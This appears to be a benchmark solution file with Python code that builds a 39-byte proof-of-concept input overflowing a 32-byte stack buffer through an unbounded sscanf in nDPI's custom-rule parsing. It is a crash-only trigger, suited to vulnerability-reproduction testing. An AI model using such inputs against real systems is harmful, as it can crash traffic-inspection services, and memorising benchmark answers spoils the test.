import os

class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generate a PoC that triggers the vulnerability.

        The vulnerability is a stack buffer overflow in `ndpi_add_host_ip_subprotocol`
        due to an unbounded `sscanf` call. The function parses a string with the format
        `"%[^:]:%d %[^\n]"`, writing the last part into a 32-byte buffer `tail`.

        The PoC is a custom protocol rule that exploits this. The rule format is
        `protocol:value`. The `value` is passed to the vulnerable function.

        We construct a minimal PoC to achieve a high score:
        - Protocol: `DNS` (a short, valid protocol name).
        - Value for sscanf:
          - Host (`%[^:]`): `A` (a single character).
          - Port (`%d`): `1` (a single digit).
          - Tail (`%[^\n]`): `A` * 32. This will cause a 1-byte overflow
            (32 'A's + null terminator = 33 bytes) into the 32-byte buffer.
        
        Since the evaluation environment uses AddressSanitizer, even this minimal
        overflow is sufficient to reliably trigger a crash. The space in the sscanf
        format string can be omitted in the input, further shortening the PoC.

        The resulting PoC is `b'DNS:A:1' + b'A' * 32`, with a length of 39 bytes.
        """
        
        # Protocol part of the rule
        protocol = b'DNS'
        
        # Value part, crafted to trigger the sscanf overflow
        host = b'A'
        port = b'1'
        overflow_payload = b'A' * 32  # Overflows the 32-byte 'tail' buffer

        value = host + b':' + port + overflow_payload
        
        # Full PoC line for the custom rules file
        poc = protocol + b':' + value
        
        return poc